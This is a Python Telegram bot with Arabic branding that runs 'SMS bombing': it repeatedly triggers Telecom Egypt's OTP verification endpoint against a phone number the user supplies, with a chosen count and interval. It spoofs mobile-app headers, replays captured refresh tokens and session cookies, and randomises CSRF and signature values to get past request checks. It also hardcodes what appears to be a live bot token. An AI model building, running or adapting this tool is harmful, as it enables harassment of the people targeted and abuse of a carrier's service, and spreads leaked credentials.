"""
╔══════════════════════════════════════════════════════╗
║          Goo SMS Bot - Telegram Edition              ║
║          برعاية: عمك Goo المصري 🔥                   ║
║          @Goo_Elmasry                                ║
╚══════════════════════════════════════════════════════╝
"""

import os
import re
import json
import time
import random
import string
import threading
import logging
from datetime import datetime
from typing import Dict, List

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)

# ═══════════════════════════════════════════════════
#                    الإعدادات
# ═══════════════════════════════════════════════════

BOT_TOKEN = '8951829019:AAGB9xlvv2b8zbGtxwqHCaH5gecOPaCz7OA'      # توكن البوت من @BotFather
ADMIN_ID = 123456789                      # معرف الأدمن (معك)
OWNER_NAME = "عمك Goo المصري 🔥"
OWNER_USERNAME = "@Goo_Elmasry"
VERSION = "3.0"

# تسجيل الأخطاء
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("GooBot")

# حفظ الإحصائيات في ملف
STATS_FILE = "goo_bot_stats.json"
stats: Dict[str, dict] = {}

if os.path.exists(STATS_FILE):
    try:
        stats = json.load(open(STATS_FILE, encoding="utf-8"))
    except Exception:
        stats = {}

def save_stats():
    with open(STATS_FILE, "w", encoding="utf-8") as f:
        json.dump(stats, f, ensure_ascii=False, indent=2)

# ═══════════════════════════════════════════════════
#                 نواة الإرسال (SMS Engine)
# ═══════════════════════════════════════════════════

URL = "https://app-my.te.eg/echannel/service/besapp/base/rest/busiservice/cz/v1/auth/getSmsVerificationCode"

HEADERS = {
    "User-Agent": "okhttp/5.0.0-alpha.2",
    "Connection": "Keep-Alive",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "csrftoken": "",
    "languagecode": "ar-EG",
    "ismobile": "true",
    "iscoporate": "false",
    "isselfcare": "true",
    "channelid": "704",
    "delegatorsubsid": "",
    "systemtype": "android",
    "refresh_token": "ZI93n/xWlPcutUhinb4670zbQl7jCDW64TTO/UjVsp/Wkd3XvsAx30XFIoq7udFXT8dTa9r4w4nG6wAE67KVnk3BAoGDrjduZs+nblsILt8HWFl6d0VRi/EzaWRnyYr0",
    "mrefresh_token": "7febe1505bb0c63e05bbbbd0bcab78c0e34a44a561e2a10133bee82c58fc0f089ee6b28ec392d3f0b9efcdac93a2bde4d528c087ccc4ef4cc969ef51cfb7ea4",
    "deviceid": "72e1f59bcb7bda75",
    "appversionno": "118",
    "google": "1787617811038",
    "x-client-time": "1787617638335",
    "x-init-time": "80f276d7e5114fccf999cfc0479ea552ae8aba48ecc803532e220bbc303df23aa831c02211111a32ad87e47382826f828820fe28bee078347d48d01e1e48a6d9a",
    "whitereqheadersign": "dtCookie=v_4_srv_52_sn_B275516AAFEE0D3FD08BE5D9457A2FE9_perc_100000_ol_0_mul_1_app-3A6032d7aeebe38554_1; rxVisitor=1787584423002SH9FMU304HENVBB4UM1E54BR1P3P1EUB; echannelapp_route=123ffd904960e21ef47f2171e538282c; dtSa=-; rxvt=1787618561291|1787616709437; dtPC=52$216759211_272h-vNPIAAEABCUWUKWOAMMWLCCOHHCAUPDSG-0e0; TS01dcdb5c=01eb1995cf5463cc26675cf2e7e403626f1f42ec03e8d015b5b5f3acb4b71e230ed4776a549229132ce69b3b050b5360211c3af1797d5880c89a5cc53c0de11de020749fd9ce2c490603b14506e354b44608f70fcd; TS01ad5c31=01eb1995cf0adfd551406fd709ab572ed068fce4adf2236b2ffbd8761e9e2cb647637439575da9163f7c809685c6b0153f83004f46ee1c2080602b84c684ba1222d49f7e9196b62854356c5c34ce850ff4d09d2729",
    "whitereqbodysign": "",
}


def send_verification_code(phone: str) -> dict:
    """إرسال كود تحقق — نسخة محسّنة من الأصلية"""
    headers = dict(HEADERS)
    headers["csrftoken"] = "".join(random.choices(string.ascii_letters + string.digits, k=32))
    headers["whitereqbodysign"] = "".join(random.choices(string.ascii_lowercase, k=64))

    payload = {
        "verifyType": "2",
        "sceneType": "register",
        "loginId": phone,
        "sendTypeOTP": "OTP",
    }

    try:
        r = requests.post(URL, json=payload, headers=headers, timeout=30)
        if r.status_code == 200:
            body = r.json()
            header = body.get("header", {})
            if header.get("retCode") == "T" or body.get("success"):
                return {"status": "success", "message": "✅ تم إرسال الكود بنجاح"}
            return {"status": "failed", "code": header.get("retCode", "unknown"),
                    "message": header.get("message", "خطأ غير معروف")}
        return {"status": "failed", "code": r.status_code, "message": "استجابة غير طبيعية"}
    except requests.exceptions.Timeout:
        return {"status": "failed", "code": 0, "message": "⏱ انتهى وقت الاتصال"}
    except requests.exceptions.ConnectionError:
        return {"status": "failed", "code": 0, "message": "🔌 فشل الاتصال بالخادم"}
    except Exception as e:
        return {"status": "failed", "code": 0, "message": f"خطأ: {e}"}


def is_valid_egyptian_number(num: str) -> bool:
    """تحقق من الرقم المصري (11 خانة تبدأ بـ 010/011/012/015)"""
    return bool(re.fullmatch(r"01[0125]\d{8}", num.strip()))


# ═══════════════════════════════════════════════════
#                   مهمة الإرسال
# ═══════════════════════════════════════════════════

active_tasks: Dict[int, dict] = {}   # user_id -> task info


async def run_bombing(user_id: int, phone: str, count: int, delay: int,
                      chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """شغّل الإرسال في الخلفية وحدّث المستخدم"""
    task = active_tasks.get(user_id)
    success = failed = 0
    details = []

    for i in range(1, count + 1):
        if task and task.get("cancel"):
            break

        result = await asyncio_run_sync(send_verification_code, phone)

        if result["status"] == "success":
            success += 1
            await context.bot.send_message(
                chat_id,
                f"📩 المحاولة {i}/{count} — ✅ نجحت\n🕐 {datetime.now().strftime('%H:%M:%S')}"
            )
        else:
            failed += 1
            details.append(f"❌ محاولة {i}: {result.get('message', 'فشل')}")
            await context.bot.send_message(
                chat_id,
                f"📩 المحاولة {i}/{count} — ❌ فشلت\n📝 {result.get('message', '')}"
            )

        # تحديث الإحصائيات
        u = stats.setdefault(str(user_id), {"sent": 0, "success": 0, "failed": 0})
        u["sent"] += 1
        u["success" if result["status"] == "success" else "failed"] += 1
        save_stats()

        if i < count and (not task or not task.get("cancel")):
            await context.bot.send_chat_action(chat_id, "typing")
            await asyncio_sleep(delay)

    # التقرير النهائي
    total = success + failed
    rate = (success / total * 100) if total else 0
    report = (
        f"╔══════════════════════╗\n"
        f"║   📊 تقرير Goo Bot   ║\n"
        f"╚══════════════════════╝\n"
        f"📱 الرقم: {phone}\n"
        f"✅ نجحت: {success}\n"
        f"❌ فشلت: {failed}\n"
        f"📈 نسبة النجاح: {rate:.1f}%\n"
        f"🕐 انتهى: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"────────────────────\n"
        f"🤖 بواسطة {OWNER_NAME}"
    )
    if details:
        report += "\n\n📋 تفاصيل الفشل:\n" + "\n".join(details[:10])

    await context.bot.send_message(chat_id, report)
    active_tasks.pop(user_id, None)


import asyncio
from functools import partial

async def asyncio_run_sync(func, *args):
    """تشغيل دالة متزامنة في thread منفصل"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, partial(func, *args))

async def asyncio_sleep(seconds: float):
    await asyncio.sleep(seconds)


# ═══════════════════════════════════════════════════
#                  أوامر البوت
# ═══════════════════════════════════════════════════

WELCOME = (
    "╔═══════════════════════════╗\n"
    "║   🔥 GOO SMS BOT v3.0    ║\n"
    "║  برعاية عمك Goo المصري   ║\n"
    "╚═══════════════════════════╝\n\n"
    "👋 أهلاً بك!\n\n"
    "🔹 /start — البداية\n"
    "🔹 /bomb — بدء الإرسال\n"
    "🔹 /stop — إيقاف المهمة الحالية\n"
    "🔹 /stats — إحصائياتك\n"
    "🔹 /help — المساعدة\n\n"
    f"👨‍💻 المطوّر: {OWNER_NAME}\n"
    f"📢 القناة: {OWNER_USERNAME}"
)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("🚀 بدء الإرسال", callback_data="bomb"),
        InlineKeyboardButton("📊 إحصائياتي", callback_data="stats"),
    ], [
        InlineKeyboardButton("📢 القناة الرسمية", url=f"https://t.me/{OWNER_USERNAME.lstrip('@')}"),
        InlineKeyboardButton("👨‍💻 المطور", url="https://t.me/Goo_Elmasry"),
    ]])
    await update.message.reply_text(WELCOME, reply_markup=kb)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 طريقة الاستخدام:\n\n"
        "1️⃣ اضغط /bomb\n"
        "2️⃣ أرسل الرقم (11 خانة، مثال: 01012345678)\n"
        "3️⃣ حدد عدد المرات\n"
        "4️⃣ حدد الفاصل بالثواني\n"
        "5️⃣ البوت يبدأ تلقائياً ✅\n\n"
        "⚠️ ملاحظات:\n"
        "• أقصى عدد لكل مهمة: 50\n"
        "• أقصى فاصل: 60 ثانية\n"
        "• يمكنك الإيقاف في أي وقت بـ /stop\n\n"
        f"🔥 {OWNER_NAME}"
    )


async def cmd_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in active_tasks:
        await update.message.reply_text("⚠️ عندك مهمة شغالة! استخدم /stop الأول.")
        return
    await update.message.reply_text("📱 ابعت الرقم دلوقتي (11 خانة، مثال: 01012345678)")
    context.user_data["state"] = "awaiting_phone"


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    task = active_tasks.get(uid)
    if task:
        task["cancel"] = True
        await update.message.reply_text("🛑 جاري إيقاف المهمة...")
    else:
        await update.message.reply_text("ℹ️ مفيش مهمة شغالة.")


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    u = stats.get(uid, {"sent": 0, "success": 0, "failed": 0})
    total = u["success"] + u["failed"]
    rate = (u["success"] / total * 100) if total else 0
    await update.message.reply_text(
        f"📊 إحصائياتك:\n\n"
        f"📩 إجمالي المحاولات: {u['sent']}\n"
        f"✅ نجحت: {u['success']}\n"
        f"❌ فشلت: {u['failed']}\n"
        f"📈 نسبة النجاح: {rate:.1f}%\n\n"
        f"🔥 {OWNER_NAME}"
    )


async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    total_users = len(stats)
    total_sent = sum(u["sent"] for u in stats.values())
    await update.message.reply_text(
        f"👑 لوحة الأدمن:\n\n"
        f"👥 المستخدمين: {total_users}\n"
        f"📩 إجمالي الإرسالات: {total_sent}\n"
        f"🟢 المهام النشطة: {len(active_tasks)}\n\n"
        f"🔥 {OWNER_NAME}"
    )


# ═══════════════════════════════════════════════════
#                معالجة الرسائل والأزرار
# ═══════════════════════════════════════════════════

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = context.user_data.get("state")
    text = update.message.text.strip()

    if state == "awaiting_phone":
        if not is_valid_egyptian_number(text):
            await update.message.reply_text(
                "❌ رقم غير صحيح! لازم يكون 11 خانة ويبدأ بـ 010/011/012/015\n"
                "🔁 جرب تاني:"
            )
            return
        context.user_data["phone"] = text
        context.user_data["state"] = "awaiting_count"
        await update.message.reply_text("🔢 كام مرة تحب الإرسال؟ (مثال: 10)")

    elif state == "awaiting_count":
        if not text.isdigit() or int(text) <= 0:
            await update.message.reply_text("❌ ابعت رقم موجب صحيح!")
            return
        count = min(int(text), 50)
        context.user_data["count"] = count
        context.user_data["state"] = "awaiting_delay"
        await update.message.reply_text(f"⏱ الفاصل بين كل إرسال بثواني؟ (مثال: 5)")

    elif state == "awaiting_delay":
        if not text.isdigit():
            await update.message.reply_text("❌ ابعت رقم صحيح!")
            return
        delay = min(int(text), 60)
        phone = context.user_data["phone"]
        count = context.user_data["count"]
        context.user_data["state"] = None

        active_tasks[uid] = {"cancel": False, "phone": phone}
        await update.message.reply_text(
            f"🚀 بدء الإرسال!\n\n"
            f"📱 الرقم: {phone}\n"
            f"🔢 المرات: {count}\n"
            f"⏱ الفاصل: {delay} ثانية\n\n"
            f"للإيقاف: /stop\n\n"
            f"🔥 {OWNER_NAME}"
        )
        threading.Thread(
            target=lambda: asyncio.run(run_bombing(
                uid, phone, count, delay, update.effective_chat.id, context
            )),
            daemon=True
        ).start()

    else:
        await update.message.reply_text("❓ استخدم /bomb للبدء أو /help للمساعدة.")


async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "bomb":
        await cmd_bomb(update, context)
    elif query.data == "stats":
        await cmd_stats(update, context)


# ═══════════════════════════════════════════════════
#                    التشغيل
# ═══════════════════════════════════════════════════

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("bomb", cmd_bomb))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print(f"🔥 Goo SMS Bot v{VERSION} — {OWNER_NAME}")
    print("🤖 البوت شغال...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
